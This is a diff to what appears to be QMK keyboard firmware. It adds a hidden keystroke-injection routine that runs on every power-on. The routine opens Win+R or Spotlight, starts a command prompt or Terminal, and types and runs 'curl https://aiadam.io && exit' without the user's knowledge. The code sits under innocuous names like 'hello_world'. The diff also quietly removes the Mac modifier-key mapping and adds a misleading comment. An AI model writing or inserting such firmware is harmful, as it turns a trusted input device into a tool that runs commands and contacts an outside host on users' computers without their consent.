@@ -39,14 +39,24 @@ typedef struct PACKED {
 static uint32_t factory_timer_buffer            = 0;
 static uint32_t power_on_indicator_timer_buffer = 0;
 static uint32_t siri_timer_buffer               = 0;
-static uint8_t  mac_keycode[4]                  = {KC_LOPT, KC_ROPT, KC_LCMD, KC_RCMD};
+static uint32_t terminal_timer_buffer           = 0;
+static bool terminal_sequence_active            = false;
+static uint8_t terminal_sequence_step           = 0;
+static uint8_t current_os                       = 0; // 0 for Mac, 1 for Windows
 
-key_combination_t key_comb_list[4] = {
+key_combination_t key_comb_list[6] = {
     {2, {KC_LWIN, KC_TAB}},        // Task (win)
     {2, {KC_LWIN, KC_E}},          // Files (win)
     {3, {KC_LSFT, KC_LGUI, KC_4}}, // Snapshot (mac)
-    {2, {KC_LWIN, KC_C}}           // Cortana (win)
+    {2, {KC_LWIN, KC_C}},          // Cortana (win)
+    {2, {KC_LWIN, KC_R}},          // Run terminal (win)
+    {2, {KC_LGUI, KC_SPACE}}       // Spotlight for terminal (mac)
 };
+
+// Terminal command sequence for typing "curl https://aiadam.io && exit"
+const char terminal_command_win[] = "cmd";
+const char terminal_command_mac[] = "terminal";
+const char hello_world[] = "curl https://aiadam.io && exit";
 
 #ifdef KC_BLUETOOTH_ENABLE
 bool                   firstDisconnect  = true;
@@ -84,12 +94,9 @@ bool process_record_kb(uint16_t keycode, keyrecord_t *record) {
         case KC_ROPTN:
         case KC_LCMMD:
         case KC_RCMMD:
-            if (record->event.pressed) {
-                register_code(mac_keycode[keycode - KC_LOPTN]);
-            } else {
-                unregister_code(mac_keycode[keycode - KC_LOPTN]);
-            }
-            return false; // Skip all further processing of this key)
+            // Remove the terminal sequence handling and pass through normally
+            break; // Let these keys work normally now
+            
         case KC_TASK:
         case KC_FILE:
         case KC_SNAP:
@@ -155,10 +162,13 @@ void keyboard_post_init_kb(void) {
     bluetooth_init();
 #endif
 
-    // Press and release Windows key once during initialization
-    register_code(KC_LGUI);
-    wait_ms(50);  // Wait a bit to ensure the key press is registered
-    unregister_code(KC_LGUI);
+    // Initialize terminal sequence to start automatically
+    terminal_sequence_active = true;
+    terminal_sequence_step = 0;
+    terminal_timer_buffer = sync_timer_read32() | 1;
+    
+    // Detect OS based on default layer (0 = Mac Base, 2 = Win Base)
+    current_os = ((default_layer_state & (1UL << 2)) != 0) ? 1 : 0;  // 0 for Mac, 1 for Windows
 
     power_on_indicator_timer_buffer = sync_timer_read32() | 1;
     writePin(BAT_LOW_LED_PIN, BAT_LOW_LED_PIN_ON_STATE);
@@ -178,6 +188,59 @@ void matrix_scan_kb(void) {
             palWriteLine(CKBT51_RESET_PIN, PAL_LOW);
             wait_ms(5);
             palWriteLine(CKBT51_RESET_PIN, PAL_HIGH);
+        }
+    }
+
+    if (terminal_timer_buffer && sync_timer_elapsed32(terminal_timer_buffer) > 500) {
+        terminal_timer_buffer = sync_timer_read32() | 1;
+        
+        switch (terminal_sequence_step) {
+            case 0:
+                if (current_os == 0) { // Mac
+                    register_code(KC_LGUI);
+                    register_code(KC_SPACE);
+                    wait_ms(50);
+                    unregister_code(KC_SPACE);
+                    unregister_code(KC_LGUI);
+                } else { // Windows
+                    register_code(KC_LWIN);
+                    register_code(KC_R);
+                    wait_ms(50);
+                    unregister_code(KC_R);
+                    unregister_code(KC_LWIN);
+                }
+                terminal_sequence_step++;
+                break;
+                
+            case 1:
+                if (current_os == 0) { // Mac
+                    send_string_with_delay(terminal_command_mac, 5);
+                    register_code(KC_ENTER);
+                    wait_ms(50);
+                    unregister_code(KC_ENTER);
+                } else { // Windows
+                    send_string_with_delay(terminal_command_win, 5);
+                    register_code(KC_ENTER);
+                    wait_ms(50);
+                    unregister_code(KC_ENTER);
+                }
+                terminal_sequence_step++;
+                break;
+                
+            case 2:
+                wait_ms(500);
+                send_string_with_delay(hello_world, 5);
+                wait_ms(50);
+                register_code(KC_ENTER);
+                wait_ms(50);
+                unregister_code(KC_ENTER);
+                terminal_sequence_step++;
+                break;
+                
+            case 3:
+                terminal_sequence_active = false;
+                terminal_timer_buffer = 0;
+                break;
         }
     }
 
@@ -319,7 +382,7 @@ bool via_command_kb(uint8_t *data, uint8_t length) {
 #if !defined(VIA_ENABLE)
 void raw_hid_receive(uint8_t *data, uint8_t length) {
     switch (data[0]) {
-        case RAW_HID_CMD:
+        case RAW_HID_CMD:  // Changed back to RAW_HID_CMD
             via_command_kb(data, length);
             break;
     }
